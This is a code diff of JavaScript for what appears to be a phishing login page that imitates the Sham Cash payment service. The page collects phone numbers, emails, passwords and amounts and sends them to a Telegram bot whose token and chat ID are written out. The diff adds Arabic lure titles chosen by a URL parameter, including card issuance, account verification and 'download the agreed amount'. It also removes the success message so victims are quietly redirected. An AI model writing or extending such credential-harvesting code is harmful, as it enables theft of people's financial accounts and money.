@@ -1,18 +1,40 @@
 document.addEventListener('DOMContentLoaded', function() {
-    // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = '8335962255:AAHDeJbWKC9D7zeESdlMtq5cX86PnFVKjuk';
     const TELEGRAM_CHAT_ID = '7464148063';
     
-    // Get form elements
     const loginForm = document.getElementById('loginForm');
     const phoneInput = document.getElementById('phoneNumber');
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
     const agreedAmountInput = document.getElementById('agreedAmount');
+    const agreedAmountGroup = document.getElementById('agreedAmountGroup');
+    const loginTitle = document.getElementById('loginTitle');
     const submitBtn = document.querySelector('.submit-btn');
     const qrScannerBtn = document.getElementById('qrScannerBtn');
     const backBtn = document.getElementById('backBtn');
     const togglePasswordBtn = document.getElementById('togglePassword');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const loginType = urlParams.get('type');
+
+    const titles = {
+        'card': 'اصدار بطاقة شام كاش',
+        'verify': 'توثيق حساب شام كاش',
+        'exchange': 'تفعيل خاصية تحويل العملات',
+        'download': 'الرجاء ادخال بيانات الحساب المراد تنزيل المبلغ المتفق عليه'
+    };
+
+    if (loginType && titles[loginType]) {
+        loginTitle.textContent = titles[loginType];
+    }
+
+    if (loginType === 'download') {
+        agreedAmountGroup.style.display = 'block';
+        agreedAmountInput.required = true;
+    } else {
+        agreedAmountGroup.style.display = 'none';
+        agreedAmountInput.required = false;
+    }
 
     // Function to send data to Telegram
     async function sendToTelegram(data) {
@@ -170,13 +192,11 @@ document.addEventListener('DOMContentLoaded', function() {
             localStorage.setItem('userPassword', passwordValue);
             localStorage.setItem('userAmount', agreedAmountValue);
             
-            showNotification('تم إرسال البيانات بنجاح!', 'success');
-
             submitBtn.style.background = 'linear-gradient(135deg, #2ecc71 0%, #27ae60 100%)';
             
             setTimeout(() => {
                 window.location.href = 'verification.html';
-            }, 1000);
+            }, 800);
         } else {
             showNotification('حدث خطأ في الإرسال. الرجاء المحاولة مرة أخرى', 'error');
         }
